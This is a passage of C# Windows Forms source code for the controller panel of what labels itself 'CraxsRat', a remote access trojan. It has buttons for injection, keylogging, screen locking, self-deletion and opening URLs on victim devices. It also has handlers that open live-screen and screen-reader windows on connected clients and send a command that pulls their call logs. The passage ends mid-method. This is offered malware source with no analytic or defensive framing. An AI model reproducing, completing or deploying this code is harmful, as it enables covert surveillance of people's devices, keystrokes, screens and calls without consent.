            this.drakeUIButtonIcon4.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon4.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon4.Location = new System.Drawing.Point(0, 350);
            this.drakeUIButtonIcon4.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon4.Name = "drakeUIButtonIcon4";
            this.drakeUIButtonIcon4.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon4.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon4.Size = new System.Drawing.Size(92, 53);
            this.drakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon4.Symbol = 61852;
            this.drakeUIButtonIcon4.SymbolSize = 30;
            this.drakeUIButtonIcon4.TabIndex = 80;
            this.drakeUIButtonIcon4.Text = "injection";
            this.drakeUIButtonIcon4.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon4.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon4.Click += new System.EventHandler(this.drakeUIButtonIcon4_Click_1);
            // 
            // drakeUIButtonIcon15
            // 
            this.drakeUIButtonIcon15.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon15.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon15.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon15.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon15.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon15.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon15.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon15.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon15.Location = new System.Drawing.Point(227, 126);
            this.drakeUIButtonIcon15.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon15.Name = "drakeUIButtonIcon15";
            this.drakeUIButtonIcon15.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon15.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon15.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon15.Size = new System.Drawing.Size(77, 53);
            this.drakeUIButtonIcon15.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon15.Symbol = 61563;
            this.drakeUIButtonIcon15.SymbolSize = 30;
            this.drakeUIButtonIcon15.TabIndex = 68;
            this.drakeUIButtonIcon15.Text = "Files";
            this.drakeUIButtonIcon15.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon15.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon15.Click += new System.EventHandler(this.drakeUIButtonIcon15_Click_1);
            // 
            // drakeUIButtonIcon34
            // 
            this.drakeUIButtonIcon34.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon34.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon34.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon34.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon34.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon34.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon34.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon34.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon34.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon34.Location = new System.Drawing.Point(19, 271);
            this.drakeUIButtonIcon34.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon34.Name = "drakeUIButtonIcon34";
            this.drakeUIButtonIcon34.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon34.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon34.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon34.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon34.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon34.Symbol = 61475;
            this.drakeUIButtonIcon34.SymbolSize = 30;
            this.drakeUIButtonIcon34.TabIndex = 69;
            this.drakeUIButtonIcon34.Text = "Lock";
            this.drakeUIButtonIcon34.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon34.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon34.Click += new System.EventHandler(this.drakeUIButtonIcon34_Click);
            // 
            // drakeUIButtonIcon35
            // 
            this.drakeUIButtonIcon35.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon35.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon35.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon35.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon35.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon35.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon35.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon35.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon35.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon35.Location = new System.Drawing.Point(224, 54);
            this.drakeUIButtonIcon35.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon35.Name = "drakeUIButtonIcon35";
            this.drakeUIButtonIcon35.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon35.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon35.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon35.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon35.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon35.Symbol = 61724;
            this.drakeUIButtonIcon35.SymbolSize = 30;
            this.drakeUIButtonIcon35.TabIndex = 70;
            this.drakeUIButtonIcon35.Text = "Keylogger";
            this.drakeUIButtonIcon35.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon35.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon35.Click += new System.EventHandler(this.drakeUIButtonIcon35_Click);
            // 
            // drakeUIButtonIcon36
            // 
            this.drakeUIButtonIcon36.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon36.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon36.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon36.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon36.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon36.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon36.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon36.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon36.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon36.Location = new System.Drawing.Point(116, 268);
            this.drakeUIButtonIcon36.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon36.Name = "drakeUIButtonIcon36";
            this.drakeUIButtonIcon36.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon36.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon36.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon36.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon36.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon36.Symbol = 61758;
            this.drakeUIButtonIcon36.SymbolSize = 30;
            this.drakeUIButtonIcon36.TabIndex = 71;
            this.drakeUIButtonIcon36.Text = "UnLock";
            this.drakeUIButtonIcon36.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon36.Click += new System.EventHandler(this.drakeUIButtonIcon36_Click);
            // 
            // drakeUIButtonIcon37
            // 
            this.drakeUIButtonIcon37.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon37.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon37.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon37.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon37.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon37.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon37.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon37.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon37.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon37.Location = new System.Drawing.Point(224, 196);
            this.drakeUIButtonIcon37.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon37.Name = "drakeUIButtonIcon37";
            this.drakeUIButtonIcon37.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon37.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon37.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon37.Size = new System.Drawing.Size(91, 53);
            this.drakeUIButtonIcon37.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon37.Symbol = 61944;
            this.drakeUIButtonIcon37.SymbolSize = 30;
            this.drakeUIButtonIcon37.TabIndex = 72;
            this.drakeUIButtonIcon37.Text = "Self Delete";
            this.drakeUIButtonIcon37.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon37.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon37.Click += new System.EventHandler(this.drakeUIButtonIcon37_Click);
            // 
            // drakeUIButtonIcon38
            // 
            this.drakeUIButtonIcon38.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon38.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon38.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon38.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon38.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon38.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon38.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon38.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon38.Location = new System.Drawing.Point(-105, 350);
            this.drakeUIButtonIcon38.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon38.Name = "drakeUIButtonIcon38";
            this.drakeUIButtonIcon38.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon38.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon38.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon38.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon38.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon38.Symbol = 61582;
            this.drakeUIButtonIcon38.SymbolSize = 30;
            this.drakeUIButtonIcon38.TabIndex = 73;
            this.drakeUIButtonIcon38.Text = "Open url";
            this.drakeUIButtonIcon38.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon38.Click += new System.EventHandler(this.drakeUIButtonIcon38_Click);
            // 
            // Mainpanel
            // 
            this.Mainpanel.Controls.Add(this.checkenablelogs);
            this.Mainpanel.Controls.Add(this.checkclearlogs);
            this.Mainpanel.Controls.Add(this.panel15);
            this.Mainpanel.Controls.Add(this.panel14);
            this.Mainpanel.Controls.Add(this.panel10);
            this.Mainpanel.Controls.Add(this.guna2Panel1);
            this.Mainpanel.Controls.Add(this.guna2Panel4);
            this.Mainpanel.Controls.Add(this.guna2Panel3);
            this.Mainpanel.Controls.Add(this.ClientsWindow);
            this.Mainpanel.Controls.Add(this.DGVblocked);
            this.Mainpanel.Controls.Add(this.label16);
            this.Mainpanel.Controls.Add(this.connectionpanel);
            this.Mainpanel.Controls.Add(this.DataLog);
            this.Mainpanel.Controls.Add(this.Panel3);
            this.Mainpanel.Controls.Add(this.panel1);
            this.Mainpanel.Location = new System.Drawing.Point(0, 0);
            this.Mainpanel.Margin = new System.Windows.Forms.Padding(4);
            this.Mainpanel.Name = "Mainpanel";
            this.Mainpanel.Size = new System.Drawing.Size(1625, 798);
            this.Mainpanel.TabIndex = 3;
            // 
            // panel15
            // 
            this.panel15.Location = new System.Drawing.Point(1781, 85);
            this.panel15.Margin = new System.Windows.Forms.Padding(4);
            this.panel15.Name = "panel15";
            this.panel15.Size = new System.Drawing.Size(116, 42);
            this.panel15.TabIndex = 155;
            // 
            // panel14
            // 
            this.panel14.BackColor = System.Drawing.Color.DimGray;
            this.panel14.Location = new System.Drawing.Point(1656, 134);
            this.panel14.Margin = new System.Windows.Forms.Padding(4);
            this.panel14.Name = "panel14";
            this.panel14.Size = new System.Drawing.Size(237, 123);
            this.panel14.TabIndex = 154;
            // 
            // panel10
            // 
            this.panel10.BackColor = System.Drawing.Color.DimGray;
            this.panel10.Location = new System.Drawing.Point(1660, 87);
            this.panel10.Margin = new System.Windows.Forms.Padding(4);
            this.panel10.Name = "panel10";
            this.panel10.Size = new System.Drawing.Size(237, 123);
            this.panel10.TabIndex = 153;
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.Controls.Add(this.pictureBox15);
            this.guna2Panel1.Controls.Add(this.panel8);
            this.guna2Panel1.Controls.Add(this.pictureBox1);
            this.guna2Panel1.Location = new System.Drawing.Point(197, 87);
            this.guna2Panel1.Margin = new System.Windows.Forms.Padding(4);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(1424, 666);
            this.guna2Panel1.TabIndex = 152;
            // 
            // pictureBox15
            // 
            this.pictureBox15.Image = global::Eagle_Spy_Applications.Screenshot_21;
            this.pictureBox15.Location = new System.Drawing.Point(0, -2);
            this.pictureBox15.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox15.Name = "pictureBox15";
            this.pictureBox15.Size = new System.Drawing.Size(1428, 43);
            this.pictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox15.TabIndex = 154;
            this.pictureBox15.TabStop = false;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::Eagle_Spy_Applications.remo;
            this.pictureBox1.Location = new System.Drawing.Point(504, 101);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(373, 244);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 146;
            this.pictureBox1.TabStop = false;
            // 
            // CraxsMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1624, 798);
            this.Controls.Add(this.Mainpanel);
            this.DoubleBuffered = true;
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.MaximumSize = new System.Drawing.Size(2291, 1553);
            this.MinimumSize = new System.Drawing.Size(1624, 660);
            this.Name = "CraxsMain";
            this.Opacity = 0D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "CraxsRat";
            this.ctxmenu.ResumeLayout(false);
            this.ctxconnection.ResumeLayout(false);
            this.FWctx.ResumeLayout(false);
            this.TRKctx.ResumeLayout(false);
            this.blockctx.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.DataLog)).EndInit();
            this.connectionpanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVSERVS)).EndInit();
            this.blockpanel.ResumeLayout(false);
            this.notificationspanel.ResumeLayout(false);
            this.callspanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVCALLS)).EndInit();
            this.activityzpanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVNOTF)).EndInit();
            this.serverspanel.ResumeLayout(false);
            this.DashboardPanel.ResumeLayout(false);
            this.MonitorPanel.ResumeLayout(false);
            this.Panel16.ResumeLayout(false);
            this.Panel20.ResumeLayout(false);
            this.FWPANEL.ResumeLayout(false);
            this.infotitlepanel.ResumeLayout(false);
            this.infopanel.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.infobox.ResumeLayout(false);
            this.ReciveBox.ResumeLayout(false);
            this.SentBox.ResumeLayout(false);
            this.RecentBox.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGFW)).EndInit();
            this.TRKPANEL.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVTRK)).EndInit();
            this.Panel17.ResumeLayout(false);
            this.recordsShowpanel.ResumeLayout(false);
            this.recordsShowpanel.PerformLayout();
            this.Panel6.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.TCavatar)).EndInit();
            this.notifispanel.ResumeLayout(false);
            this.Panel7.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DGVALRTS)).EndInit();
            this.Panel12.ResumeLayout(false);
            this.Panel9.ResumeLayout(false);
            this.Panel11.ResumeLayout(false);
            this.panel8.ResumeLayout(false);
            this.guna2ShadowPanel4.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
            this.guna2ShadowPanel3.ResumeLayout(false);
            this.guna2ShadowPanel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
            this.guna2ShadowPanel2.ResumeLayout(false);
            this.guna2ShadowPanel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).EndInit();
            this.guna2ShadowPanel1.ResumeLayout(false);
            this.guna2ShadowPanel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.DGVblocked)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.ClientsWindow)).EndInit();
            this.guna2Panel3.ResumeLayout(false);
            this.guna2Panel3.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            this.guna2Panel4.ResumeLayout(false);
            this.Mainpanel.ResumeLayout(false);
            this.guna2Panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

	}

	private void label16_Click(object sender, EventArgs e)
	{

	}

	private void tipkey_Click(object sender, EventArgs e)
	{

	}

    private void drakeUIButtonIcon13_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "SC_Readv2_" + client.ClientAddressIP;
                        ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
                        if (screenReaderV == null)
                        {
                            screenReaderV = new ScreenReaderV2();
                            screenReaderV.Name = name;
                            screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
                            screenReaderV.Tag = client.ClientRemoteAddress;
                            screenReaderV.classClient = client;
                            screenReaderV.Client = client.myClient;
                            screenReaderV.DownloadsFolder = client.FolderUSER;
                            screenReaderV.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon1_Click_2(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Cells[8].Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Live_Screen_" + client.ClientRemoteAddress;
                        ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
                        if (screenShoter == null)
                        {
                            screenShoter = new ScreenShoter();
                            screenShoter.Name = name;
                            screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
                            screenShoter.Tag = client.ClientRemoteAddress;
                            screenShoter.classClient = client;
                            screenShoter.Client = client.myClient;
                            screenShoter.DownloadsFolder = client.FolderUSER;
                            screenShoter.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon22_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Cells[8].Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon33_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
